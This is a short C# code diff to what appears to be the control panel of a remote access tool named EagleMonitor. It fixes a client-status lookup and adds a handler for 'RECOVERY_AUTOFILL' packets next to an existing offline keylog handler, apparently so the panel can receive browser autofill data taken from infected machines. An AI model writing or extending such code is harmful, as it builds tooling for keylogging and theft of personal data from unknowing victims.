@@ -59,7 +59,9 @@ namespace EagleMonitor.Networking
                         break;
 
                     case PacketType.CONNECTED:
-                        row.Cells["Column5"].Value = ClientHandler.ClientHandlersList[packet.baseIp].clientStatus;
+                        row.Cells["Column5"].Value = ((ConnectedPacket)packet).clientStatus;
+                        //This provokes key not found in dictionary
+                        //ClientHandler.ClientHandlersList[packet.baseIp].clientStatus;
                         break;
 
                     case PacketType.FM_SHORTCUT_PATH:
@@ -167,6 +169,11 @@ namespace EagleMonitor.Networking
                 case PacketType.KEYLOG_OFFLINE:
                     KeylogOfflinePacket keylogOfflinePacket = (KeylogOfflinePacket)packet;
                     new KeylogOfflinePacketHandler(keylogOfflinePacket, clientHandler);
+                    break;
+
+                case PacketType.RECOVERY_AUTOFILL:
+                    AutofillPacket autofillPacket = (AutofillPacket)packet;
+                    new AutofillPacketParser(autofillPacket, clientHandler);
                     break;
 
             }
